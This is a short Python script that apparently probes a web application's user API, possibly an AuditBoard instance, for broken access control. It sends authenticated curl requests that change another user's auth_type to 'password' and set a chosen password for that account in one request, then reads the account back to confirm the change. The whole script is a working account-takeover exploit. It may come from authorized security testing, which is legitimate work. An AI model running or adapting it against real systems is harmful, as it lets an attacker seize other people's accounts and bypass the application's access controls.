import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== is auth_type writable on a no-access role-2 target (17)? ===")
c,b=req('PUT','/api/v1/users/17',{"user":{"auth_type":"password"}})
print("  PUT auth_type=password ->",c, b[:180].replace(chr(10),' '))
c,b=req('GET','/api/v1/users/17')
u=json.loads(b)['users'][0]
print("  read back auth_type:",u.get('auth_type'))
print("\n=== combined: flip auth_type + set password in ONE request ===")
c,b=req('PUT','/api/v1/users/17',{"user":{"auth_type":"password","password":"Zx9!flip47"}})
print("  ->",c, b[:180].replace(chr(10),' '))
c,b=req('GET','/api/v1/users/17')
u=json.loads(b)['users'][0]
print("  auth_type now:",u.get('auth_type'))
